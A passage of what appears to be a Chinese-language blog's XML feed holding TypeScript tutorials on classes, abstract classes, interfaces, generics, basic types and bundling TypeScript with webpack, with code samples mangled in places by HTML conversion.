console.log(`父类中的run方法！`);&#125;</code></pre>}class Dog extends Animal{<pre><code>bark()&#123;    console.log(`$&#123;this.name&#125;在汪汪叫！`);&#125;run()&#123;    console.log(`子类中的run方法，会重写父类中的run方法！`);&#125;</code></pre>}const dog = new Dog(‘旺财’, 4);<br>dog.bark();<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 在子类中可以使用super来完成对父类的引用</span><br><span class="line"></span><br><span class="line">## 抽象类</span><br><span class="line"></span><br><span class="line">- 抽象类是专门用来被其他类所继承的类，它只能被其他类所继承不能用来创建实例</span><br><span class="line"></span><br><span class="line">- ```typescript</span><br><span class="line">  abstract class Animal&#123;</span><br><span class="line">      abstract run(): void;</span><br><span class="line">      bark()&#123;</span><br><span class="line">          console.log(&#x27;动物在叫~&#x27;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  class Dog extends Animals&#123;</span><br><span class="line">      run()&#123;</span><br><span class="line">          console.log(&#x27;狗在跑~&#x27;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>使用abstract开头的方法叫做抽象方法，抽象方法没有方法体只能定义在抽象类中，继承抽象类时抽象方法必须要实现</p></li></ul><h1 id="函数定义类型"><a href="#函数定义类型" class="headerlink" title="函数定义类型"></a>函数定义类型</h1><p>为函数添加类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function add(x:number, y: number): number&#123;</span><br><span class="line">    return x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let myadd = function(x: number, y:number): number&#123;</span><br><span class="line">    return x+y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以给每个参数添加类型之后再为函数本身添加返回值类型， TypeScript能够根据返回语句自动推断出返回值类型</p><p>书写完整的函数类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let myadd:(x: number, y:number) =&gt; number = function(x:number, y:number): number&#123;</span><br><span class="line">return x+ y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>接口的作用类似于抽象类，不同点在于接口中的所有方法和属性都是没有实值的，换句话说接口中的所有方法都是抽象方法。接口主要负责定义一个类的结构，接口可以去限制一个对象的接口，对象只有包含接口中定义的所有属性和方法时才能匹配接口。同时，可以让一个类去实现接口，实现接口时类中要保护接口中的所有属性。</p><ul><li><p>示例（检查对象类型）：</p><ul><li><p>```typescript<br>interface Person{</p><pre><code>name: string;sayHello():void;</code></pre><p>}</p><p>function fn(per: Person){</p><pre><code>per.sayHello();</code></pre><p>}</p><p>fn({name:’孙悟空’, sayHello() {console.log(<code>Hello, 我是 $&#123;this.name&#125;</code>)}});</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 示例（实现）</span><br><span class="line"></span><br><span class="line">  - ```typescript</span><br><span class="line">    interface Person&#123;</span><br><span class="line">        name: string;</span><br><span class="line">        sayHello():void;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    class Student implements Person&#123;</span><br><span class="line">        constructor(public name: string) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        sayHello() &#123;</span><br><span class="line">            console.log(&#x27;大家好，我是&#x27;+this.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li></li></ul></li></ul><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><p>定义一个函数或类时，有些情况下无法确定其中要使用的具体类型（返回值、参数、属性的类型不能确定），此时泛型便能够发挥作用。</p><ul><li><p>举个例子：</p><ul><li><p>```typescript<br>function test(arg: any): any{</p><pre><code>return arg;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 上例中，test函数有一个参数类型不确定，但是能确定的时其返回值的类型和参数的类型是相同的，由于类型不确定所以参数和返回值均使用了any，但是很明显这样做是不合适的，首先使用any会关闭TS的类型检查，其次这样设置也不能体现出参数和返回值是相同的类型</span><br><span class="line"></span><br><span class="line">- 使用泛型：</span><br><span class="line"></span><br><span class="line">- ```typescript</span><br><span class="line">  function test&lt;T&gt;(arg: T): T&#123;</span><br><span class="line">  return arg;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>这里的<code>&lt;T&gt;</code>就是泛型，T是我们给这个类型起的名字（不一定非叫T），设置泛型后即可在函数中使用T来表示该类型。所以泛型其实很好理解，就表示某个类型。</p></li><li><p>那么如何使用上边的函数呢？</p><ul><li><p>方式一（直接使用）：</p><ul><li><p>```typescript<br>test(10)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 使用时可以直接传递参数使用，类型会由TS自动推断出来，但有时编译器无法自动推断时还需要使用下面的方式</span><br><span class="line"></span><br><span class="line">- 方式二（指定类型）：</span><br><span class="line"></span><br><span class="line">  - ```typescript</span><br><span class="line">    test&lt;number&gt;(10)</span><br></pre></td></tr></table></figure></li><li><p>也可以在函数后手动指定泛型</p></li></ul></li></ul></li><li><p>可以同时指定多个泛型，泛型间使用逗号隔开：</p><ul><li>```typescript<br>function test&lt;T, K&gt;(a: T, b: K): K{<pre><code>return b;</code></pre>}test&lt;number, string&gt;(10, “hello”);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 使用泛型时，完全可以将泛型当成是一个普通的类去使用</span><br><span class="line"></span><br><span class="line">- 类中同样可以使用泛型：</span><br><span class="line"></span><br><span class="line">  - ```typescript</span><br><span class="line">    class MyClass&lt;T&gt;&#123;</span><br><span class="line">        prop: T;</span><br><span class="line">    </span><br><span class="line">        constructor(prop: T)&#123;</span><br><span class="line">            this.prop = prop;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>除此之外，也可以对泛型的范围进行约束</p><ul><li><pre><code class="typescript">interface MyInter&#123;    length: number;&#125;function test&lt;T extends MyInter&gt;(arg: T): number&#123;    return arg.length;&#125;</code></pre></li><li><p>使用T extends MyInter表示泛型T必须是MyInter的子类，不一定非要使用接口类和抽象类同样适用。</p></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack打包TypeScript</title>
      <link href="/2022/03/17/TypeScrip%E6%89%93%E5%8C%85/"/>
      <url>/2022/03/17/TypeScrip%E6%89%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h1><ul><li><p>通常情况下，实际开发中我们都需要使用构建工具对代码进行打包，TS同样也可以结合构建工具一起使用，下边以webpack为例介绍一下如何结合构建工具使用TS。</p></li><li><p>步骤：</p><ol><li><p>初始化项目</p><ul><li>进入项目根目录，执行命令 <code> npm init -y</code><ul><li>主要作用：创建package.json文件</li></ul></li></ul></li><li><p>下载构建工具</p><ul><li><code>npm i -D webpack webpack-cli webpack-dev-server typescript ts-loader clean-webpack-plugin</code><ul><li>共安装了7个包<ul><li>webpack<ul><li>构建工具webpack</li></ul></li><li>webpack-cli<ul><li>webpack的命令行工具</li></ul></li><li>webpack-dev-server<ul><li>webpack的开发服务器</li></ul></li><li>typescript<ul><li>ts编译器</li></ul></li><li>ts-loader<ul><li>ts加载器，用于在webpack中编译ts文件</li></ul></li><li>html-webpack-plugin<ul><li>webpack中html插件，用来自动创建html文件</li></ul></li><li>clean-webpack-plugin<ul><li>webpack中的清除插件，每次构建都会先清除目录</li></ul></li></ul></li></ul></li></ul></li><li><p>根目录下创建webpack的配置文件webpack.config.js</p><ul><li>```javascript<br>const path = require(“path”);<br>const HtmlWebpackPlugin = require(“html-webpack-plugin”);<br>const { CleanWebpackPlugin } = require(“clean-webpack-plugin”);module.exports = {<pre><code>optimization:&#123;    minimize: false // 关闭代码压缩，可选&#125;,entry: &quot;./src/index.ts&quot;,devtool: &quot;inline-source-map&quot;,devServer: &#123;    contentBase: &#39;./dist&#39;&#125;,output: &#123;    path: path.resolve(__dirname, &quot;dist&quot;),    filename: &quot;bundle.js&quot;,    environment: &#123;        arrowFunction: false // 关闭webpack的箭头函数，可选    &#125;&#125;,resolve: &#123;    extensions: [&quot;.ts&quot;, &quot;.js&quot;]&#125;,module: &#123;    rules: [        &#123;            test: /\.ts$/,            use: &#123;               loader: &quot;ts-loader&quot;                 &#125;,            exclude: /node_modules/        &#125;    ]&#125;,plugins: [    new CleanWebpackPlugin(),    new HtmlWebpackPlugin(&#123;        title:&#39;TS测试&#39;    &#125;),]</code></pre>}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. 根目录下创建tsconfig.json，配置可以根据自己需要</span><br><span class="line"></span><br><span class="line">   - ```json</span><br><span class="line">     &#123;</span><br><span class="line">         &quot;compilerOptions&quot;: &#123;</span><br><span class="line">             &quot;target&quot;: &quot;ES2015&quot;,</span><br><span class="line">             &quot;module&quot;: &quot;ES2015&quot;,</span><br><span class="line">             &quot;strict&quot;: true</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>修改package.json添加如下配置</p><ul><li><pre><code class="json">&#123;  ...略...  &quot;scripts&quot;: &#123;    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;,    &quot;build&quot;: &quot;webpack&quot;,    &quot;start&quot;: &quot;webpack serve --open chrome.exe&quot;  &#125;,  ...略...&#125;</code></pre></li></ul></li><li><p>在src下创建ts文件，并在并命令行执行<code>npm run build</code>对代码进行编译，或者执行<code>npm start</code>来启动开发服务器</p></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScrip基础类型</title>
      <link href="/2022/03/16/TypeScript%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/03/16/TypeScript%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<center><h1>TypeScrip基础类型</h1></center><h1 id="TypeScript简介"><a href="#TypeScript简介" class="headerlink" title="TypeScript简介"></a>TypeScript简介</h1><ol><li>TypeScript是JavaScript的超集。</li><li>它对JS进行了扩展，向JS中引入了类型的概念，并添加了许多新的特性。</li><li>TS代码需要通过编译器编译为JS，然后再交由JS解析器执行。</li><li>TS完全兼容JS，换言之，任何的JS代码都可以直接当成JS使用。</li><li>相较于JS而言，TS拥有了静态类型，更加严格的语法，更强大的功能；TS可以在代码执行前就完成代码的检查，减小了运行时异常的出现的几率；TS代码可以编译为任意版本的JS代码，可有效解决不同JS运行环境的兼容问题；同样的功能，TS的代码量要大于JS，但由于TS的代码结构更加清晰，变量类型更加明确，在后期代码的维护中TS却远远胜于JS。</li></ol><h1 id="TypeScript-开发环境搭建"><a href="#TypeScript-开发环境搭建" class="headerlink" title="TypeScript 开发环境搭建"></a>TypeScript 开发环境搭建</h1><ol><li><p>下载Node.js</p><ul><li>64位：<a href="https://nodejs.org/dist/v14.15.1/node-v14.15.1-x64.msi">https://nodejs.org/dist/v14.15.1/node-v14.15.1-x64.msi</a></li><li>32位：<a href="https://nodejs.org/dist/v14.15.1/node-v14.15.1-x86.msi">https://nodejs.org/dist/v14.15.1/node-v14.15.1-x86.msi</a></li></ul></li><li><p>安装Node.js</p></li><li><p>使用npm全局安装typescript</p><ul><li>进入命令行</li><li>输入：npm i -g typescript</li></ul></li><li><p>创建一个ts文件</p></li><li><p>使用tsc对ts文件进行编译</p><ul><li>进入命令行</li><li>进入ts文件所在目录</li><li>执行命令：tsc xxx.ts</li></ul></li></ol><h1 id="类-演示"><a href="#类-演示" class="headerlink" title="类(演示)"></a>类(演示)</h1><p>可以基于类的面向对象编程</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**类的演示 */</span></span><br><span class="line"></span><br><span class="line">( <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="attr">fullName</span>: string</span><br><span class="line">        <span class="attr">firstName</span>: string</span><br><span class="line">        <span class="attr">lastName</span>: string</span><br><span class="line"></span><br><span class="line">        <span class="title">constructor</span> (<span class="params">firstName: string, lastName: string</span>)&#123;</span><br><span class="line">            <span class="built_in">this</span>.firstName = firstName</span><br><span class="line">            <span class="built_in">this</span>.lastName = lastName</span><br><span class="line">            <span class="built_in">this</span>.fullName = firstName + <span class="string">&#x27;_&#x27;</span> + lastName</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showFullName</span>(<span class="params">persion</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> persion.firstName + persion.lastName</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> persion = <span class="keyword">new</span> User(<span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;小可&#x27;</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;object :&gt;&gt; &#x27;</span>, showFullName(persion));</span><br><span class="line">    </span><br><span class="line">&#125; )()</span><br></pre></td></tr></table></figure><h1 id="类型注解"><a href="#类型注解" class="headerlink" title="类型注解"></a>类型注解</h1><p>类型注解是一种轻量级为函数或者变量添加的约束</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">( <span class="function">()=&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showMsg</span>(<span class="params">str:string</span>)</span>&#123; <span class="comment">//string 对接收参数的约束只能接收string类型的参数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;床前明月光&#x27;</span> + str</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> msg = <span class="string">&#x27;疑是地上霜&#x27;</span></span><br><span class="line">    <span class="built_in">console</span>.log(showMsg(msg));</span><br><span class="line">     </span><br><span class="line">&#125; )()</span><br></pre></td></tr></table></figure><h1 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h1><ul><li><p>类型声明</p><ul><li><p>类型声明式TS非常重要的一个特点</p></li><li><p>通过类型声明可以指定TS中变量（参数、形参）的类型</p></li><li><p>指定类型后，当为变量赋值时，TS编译器会自动检查值是否符合类型声明，符合则赋值，否则报错</p></li><li><p>简而言之，类型声明给变量设置了类型，使得变量只能存储某种类型的值</p></li><li><p>语法</p><ul><li>```javascript<br>let 变量: 类型;let 变量: 类型 = 值;function fn(参数: 类型, 参数: 类型): 类型{<pre><code>...</code></pre>}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 自动类型判断</span><br><span class="line"></span><br><span class="line">  - TS拥有自动的类型判断机制</span><br><span class="line">  - 当对变量的声明和赋值是同时进行的，TS编译器会自动判断变量的类型</span><br><span class="line">  - 所以如果你的变量的声明和赋值时同时进行的，可以省略掉类型声明</span><br><span class="line"></span><br><span class="line">类型</span><br><span class="line"></span><br><span class="line">|  类型   |       例子        |              描述              |</span><br><span class="line">| :-----: | :---------------: | :----------------------------: |</span><br><span class="line">| number  |    1, -33, 2.5    |            任意数字            |</span><br><span class="line">| string  | &#x27;hi&#x27;, &quot;hi&quot;, `hi`  |           任意字符串           |</span><br><span class="line">| boolean |    true、false    |       布尔值true或false        |</span><br><span class="line">| 字面量  |      其本身       |  限制变量的值就是该字面量的值  |</span><br><span class="line">|   any   |         *         |            任意类型            |</span><br><span class="line">| unknown |         *         |         类型安全的any          |</span><br><span class="line">|  void   | 空值（undefined） |     没有值（或undefined）      |</span><br><span class="line">|  never  |      没有值       |          不能是任何值          |</span><br><span class="line">| object  |  &#123;name:&#x27;孙悟空&#x27;&#125;  |          任意的JS对象          |</span><br><span class="line">|  array  |      [1,2,3]      |           任意JS数组           |</span><br><span class="line">|  tuple  |       [4,5]       | 元素，TS新增类型，固定长度数组 |</span><br><span class="line">|  enum   |    enum&#123;A, B&#125;     |       枚举，TS中新增类型       |</span><br><span class="line"></span><br><span class="line"># 接口约束</span><br><span class="line"></span><br><span class="line">这里我们使用接口来描述拥有firstName和lastName字段的对象，在`TypeScript`里只在两个类型内部的结构兼容，那么这两个类型就是兼容的,这就允许我们在实现接口的时候只要包含了接口要求的结构就可以,而不必明确使用implements语句</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">( ()=&gt;&#123;</span><br><span class="line">    // 定义一个接口， 接口可以对参数进行约束</span><br><span class="line">    interface Iperson&#123;</span><br><span class="line">        firstName:string //姓氏</span><br><span class="line">        lastName: string  // 名字</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 输出姓名</span><br><span class="line">    function showFullName(persion : Iperson)&#123;</span><br><span class="line">        return persion.firstName + &#x27;_&#x27;  +persion.lastName</span><br><span class="line">    &#125;</span><br><span class="line">    // 定义一个对象</span><br><span class="line">    const persion = &#123;</span><br><span class="line">        firstName: &#x27;你好&#x27;,</span><br><span class="line">        lastName: &#x27;小明&#x27;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    console.log(showFullName(persion))</span><br><span class="line">&#125; )()</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h1 id="基础类型"><a href="#基础类型" class="headerlink" title="基础类型"></a>基础类型</h1><p>ts中变量开始时什么类型那么后期赋值的时候只能用这个类型进行赋值</p><h2 id="布尔值类型"><a href="#布尔值类型" class="headerlink" title="布尔值类型"></a>布尔值类型</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 布尔值类型 --boolean</span></span><br><span class="line"><span class="comment">// let 变量: 数据类型</span></span><br><span class="line"><span class="keyword">let</span> flag: boolean = <span class="literal">true</span></span><br><span class="line"><span class="built_in">console</span>.log(flag);</span><br></pre></td></tr></table></figure><h2 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数字类型 --number</span></span><br><span class="line"><span class="keyword">let</span> a1: number = <span class="number">10</span> <span class="comment">// 十进制</span></span><br><span class="line"><span class="keyword">let</span> a2: number = <span class="number">10101</span> <span class="comment">// 二进制</span></span><br><span class="line"><span class="keyword">let</span> a3: number = <span class="number">10101</span> <span class="comment">// 八进制</span></span><br><span class="line"><span class="keyword">let</span> a4: number = <span class="number">10101</span> <span class="comment">// 十六进制</span></span><br><span class="line"><span class="built_in">console</span>.log(a1);</span><br><span class="line"><span class="built_in">console</span>.log(a2);</span><br><span class="line"><span class="built_in">console</span>.log(a3);</span><br><span class="line"><span class="built_in">console</span>.log(a4);</span><br></pre></td></tr></table></figure><h2 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符串类型</span></span><br><span class="line"><span class="keyword">let</span> str1: string =<span class="string">&#x27;小明&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(str1);</span><br></pre></td></tr></table></figure><h2 id="undefined和null"><a href="#undefined和null" class="headerlink" title="undefined和null"></a>undefined和null</h2><p>undefined 和 null 都可以作为其他类型的子类型, 把undefined和null赋值给其他类型的变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> und: <span class="literal">undefined</span> = <span class="literal">undefined</span></span><br><span class="line">    <span class="keyword">let</span> nll: <span class="literal">null</span> = <span class="literal">null</span></span><br><span class="line">    <span class="built_in">console</span>.log(und);</span><br><span class="line">    <span class="built_in">console</span>.log(nll);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> num2: number = <span class="literal">undefined</span></span><br><span class="line">    <span class="built_in">console</span>.log(num2)</span><br></pre></td></tr></table></figure><h2 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h2><p>数组定义后里面的数据的类型和定义的时候的类型是一致的，否则有错误信息提示，也不会有编译通过的</p><p>数组定义方式1</p><p> let 变量： 数据类型[] = [值1, 值2]</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arraty: number[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;array :&gt;&gt; &#x27;</span>, arraty);</span><br></pre></td></tr></table></figure><p>数组定义方式2 泛型</p><p>let 变量名: Array&lt;数据类型&gt; = [值1，值2，值3]</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arry: <span class="built_in">Array</span>&lt;number&gt; = [<span class="number">100</span>,<span class="number">200</span>,<span class="number">300</span>] </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;array :&gt;&gt; &#x27;</span>, arry);</span><br></pre></td></tr></table></figure><h2 id="元组类型"><a href="#元组类型" class="headerlink" title="元组类型"></a>元组类型</h2><p>在定义数组的时候，类型和数据的个数就已经限定</p><p><code>元组在使用的时候 数据的类型位置和数据的个数 应该在定义元组的时候类型及位置应该是一致的</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr3: [string, number, boolean] = [<span class="string">&#x27;小明&#x27;</span>, <span class="number">100</span>, <span class="literal">true</span>]</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;arr3 :&gt;&gt; &#x27;</span>, arr3);</span><br></pre></td></tr></table></figure><h2 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h2><p>枚举里面的个数数据值都可以叫元素， 每个元素都有自己的编号，编号是从0开始的，一递增加1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enum Colr&#123;</span><br><span class="line">    red,</span><br><span class="line">    green,</span><br><span class="line">    blue</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> color: Colr = Colr.red</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;color :&gt;&gt; &#x27;</span>, color);</span><br></pre></td></tr></table></figure><p>或者采用手动赋值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enum Colr&#123;</span><br><span class="line">    red = <span class="number">11</span>,</span><br><span class="line">    green = <span class="number">22</span>,</span><br><span class="line">    blue = <span class="number">33</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> color: Colr = Colr.red</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;color :&gt;&gt; &#x27;</span>, color);</span><br></pre></td></tr></table></figure><p>枚举类型提供一个便利可以由枚举的值得到它得名字, 例如 我们知道2，但是不确定它映射到Colr里面的哪个名字，我们可以查询到相应的名字</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enum Colr&#123;</span><br><span class="line">    red = <span class="number">11</span>,</span><br><span class="line">    green = <span class="number">22</span>,</span><br><span class="line">    blue = <span class="number">33</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> colorName: string = Colr[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;colorName :&gt;&gt; &#x27;</span>, colorName);</span><br></pre></td></tr></table></figure><h2 id="any-类型"><a href="#any-类型" class="headerlink" title="any 类型"></a>any 类型</h2><p>当一个数组中要存储对个数据 类型不确定此时也可以使用any类型来定义数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str: any = <span class="number">100</span></span><br><span class="line">    str = <span class="string">&#x27;小明&#x27;</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;str :&gt;&gt; &#x27;</span>, str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span>  arr: any[] = [<span class="string">&#x27;小红&#x27;</span>, <span 